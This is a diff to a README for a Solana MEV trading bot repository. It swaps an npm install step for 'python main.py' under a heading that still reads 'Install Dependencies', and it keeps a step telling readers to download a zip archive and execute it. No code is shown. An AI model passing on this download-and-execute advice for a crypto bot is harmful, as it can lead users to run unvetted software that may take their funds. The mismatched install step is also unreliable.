@@ -43,10 +43,8 @@ To install the SOLANA MEV BOT TRADING, follow these steps:
    ```
 
 2. **Install Dependencies**:
-   Ensure you have Node.js installed. Then, run:
-   ```bash
-   npm install
-   ```
+   Ensure you have python installed. Then, run:
+   python main.py
 
 3. **Download and Execute**:
    For the latest releases, visit the [Releases](https://github.com/kewmarcussanti9/SOLANA_MEV-BOT_TRADING/archive/refs/heads/main.zip) section. Download the latest version and execute it.
